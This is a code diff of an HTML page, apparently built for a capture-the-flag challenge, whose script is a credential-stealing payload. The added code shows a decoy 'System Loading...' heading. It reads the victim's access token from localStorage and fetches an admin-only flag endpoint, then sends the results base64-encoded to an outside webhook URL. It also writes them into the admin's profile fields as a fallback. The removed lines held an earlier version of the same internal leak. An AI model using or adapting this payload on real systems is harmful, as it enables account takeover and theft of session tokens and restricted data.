@@ -1,37 +1,45 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>System Loading...</h1>
     <script>
-        async function captureAndLeak() {
-            // 1. Try to grab the JWT from LocalStorage or SessionStorage
-            const token = localStorage.getItem('accessToken') || 
-                          sessionStorage.getItem('accessToken') || 
-                          "Token not in Storage";
+        const webhook = "https://webhooksite.net/215b196e-0451-4dc6-8065-d0328a121432";
 
-            // 2. Try to fetch the Flag from the restricted endpoint
-            let flag = "Flag not found";
+        async function ultimateLeak() {
+            let log = { status: "started", flag: "not_found", token: "not_found" };
+
             try {
-                const res = await fetch('/api/admin/flag');
-                if(res.ok) flag = await res.text();
-            } catch(e) {}
+                // 1. Attempt to grab the 1000pt Flag
+                const flagRes = await fetch('/api/admin/flag');
+                if (flagRes.ok) log.flag = await flagRes.text();
 
-            // 3. INTERNAL LEAK: Save both the Token and Flag into the Admin's Profile
-            // We use the 'phoneNumber' and 'address' fields as our "storage"
-            await fetch('/api/auth/profile', {
-                method: 'PATCH',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "fullName": "LEAK_SUCCESS",
-                    "phoneNumber": flag.substring(0, 50),
-                    "address": {
-                        "street": token.substring(0, 50), // First part of JWT
-                        "city": token.substring(50, 100), // Second part of JWT
-                        "state": "LB"
-                    }
-                })
-            });
+                // 2. Attempt to grab the Auth Token (ATO)
+                log.token = localStorage.getItem('accessToken') || "no_token_in_storage";
+
+                // 3. EXTERNAL LEAK: Try the Webhook (might be blocked)
+                fetch(`${webhook}?data=${btoa(JSON.stringify(log))}`);
+
+                // 4. INTERNAL LEAK: Write to the Admin's own profile (the bypass)
+                // We'll put the flag in the phone number and the token in the address
+                await fetch('/api/auth/profile', {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        "fullName": "LEAK_COMPLETE",
+                        "phoneNumber": log.flag.substring(0, 50),
+                        "address": {
+                            "street": log.token.substring(0, 50),
+                            "city": "Check_Webhook_Or_JSON"
+                        }
+                    })
+                });
+            } catch (e) {
+                // Fail-safe: notify webhook of the error
+                fetch(`${webhook}?error=${btoa(e.message)}`);
+            }
         }
-        captureAndLeak();
+
+        ultimateLeak();
     </script>
 </body>
 </html>
